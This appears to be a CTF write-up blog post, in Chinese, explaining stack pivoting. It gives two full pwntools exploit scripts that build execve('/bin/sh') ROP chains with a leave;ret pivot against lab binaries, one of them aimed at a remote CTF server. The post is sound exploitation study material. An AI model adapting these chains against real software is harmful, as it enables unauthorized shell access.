---
title: Stack Pivoting WriteUp
date: 2024-08-09 16:06:27
category: 
    - PWN
tags: pwn
---

## Stack Pivoting

>前言:在控制rip後沒有足夠的stack空間讓我們推rop chain這時就需要stack pivoting技術

蓋到buf結束後，塞入`leave;ret;`gadget，讓rbp跳到我們指定的stack位置，然後就會出現**超大空間**

圖片來自LYS投影片
![Alt text](/images/pwn-1.png)

## Ais3-lys-rop1

```python
from pwn import *

context.arch = 'amd64'

# r = remote("35.229.243.81" ,10102)
r = process('../lab_rop2/rop2')

pop_rax = 0x000000000044fd87
pop_rdx_rbx = 0x0000000000485bab
pop_rdi = 0x0000000000401f4f
pop_rsi =0x0000000000409f7e
buf = 0x4c7300
syscall = 0x0000000000401d04

leave_ret = 0x4017ee

chain = b'/bin/sh\x00'
chain += p64(pop_rax) + p64(59)
chain += p64(pop_rsi) + p64(0x0)
chain += p64(pop_rdi) + p64(buf)
chain += p64(pop_rdx_rbx) + p64(0x0)+p64(0x0)
chain += p64(syscall)


p1 = b'a'*0x10
p1 += p64(buf)
p1 += p64(leave_ret)

# pause()
r.sendlineafter(b'name? ',chain)

r.sendlineafter(b'vuln: ',p1)

r.interactive()

```

## ncku-ctf-pivoting

這邊上下兩題幾乎一樣只有gadget需要重找

```python
from pwn import *

# context.terminal = ["tmux",'splitw','-h']
context.arch = 'amd64'

# r = process("./chal")
r = remote("chall.nckuctf.org",10011)

pop_rdi = 0x401f1f
pop_rax = 0x44ff47
pop_rsi = 0x409f8e 
pop_rdx_rbx = 0x485ccb 
syscall = 0x401cd4

name = 0x4c7220
leave_ret = 0x401877

p = flat(
    '/bin/sh\x00',
    pop_rdi,
    name,
    pop_rsi,
    0x0,
    pop_rax,
    0x3b,
    pop_rdx_rbx,
    0x0,0x0,
    syscall
)

pri = flat(
    'a'*0x20,
    name,
    leave_ret,
)

# gdb.attach(r)
r.sendlineafter(b'?',p)
r.sendlineafter(b':',pri)

r.sendline(b'cat /home/$(whoami)/flag*')

r.interactive()
```
